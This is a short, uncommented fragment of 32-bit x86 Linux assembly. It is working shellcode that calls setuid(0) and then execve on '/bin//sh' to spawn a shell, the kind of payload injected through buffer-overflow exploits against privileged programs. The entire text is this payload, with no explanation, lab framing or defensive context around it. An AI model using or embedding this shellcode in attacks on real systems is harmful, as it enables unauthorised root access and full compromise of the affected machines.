xor eax, eax 
mov ebx, eax
mov al, 0x17
int 0x80
pop ebx
xor eax, eax
push eax 
push 0x68732f2f 
push 0x6e69622f 
mov ebx, esp 
push eax 
mov edx, esp
push ebx 
mov ecx, esp 
mov al, 11 
int 0x80 
